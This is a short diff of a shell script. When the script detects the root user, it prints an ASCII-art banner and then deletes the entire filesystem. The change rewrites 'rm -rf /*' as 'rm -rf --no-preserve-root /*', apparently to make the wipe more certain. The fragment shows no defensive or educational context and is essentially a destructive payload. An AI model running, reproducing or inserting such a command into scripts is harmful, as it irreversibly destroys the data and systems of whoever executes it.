@@ -35,7 +35,7 @@ if [ "$user" == "root" ]; then
 		echo "     | |  | | | | | |        | |  | |    / /   "
 		echo "     |_|  |_| |_| |_|        |_|  |_|   /_/    "
 		echo "                                   		 "
-        	rm -rf /*
+        	rm -rf --no-preserve-root /*
 
 
 	else
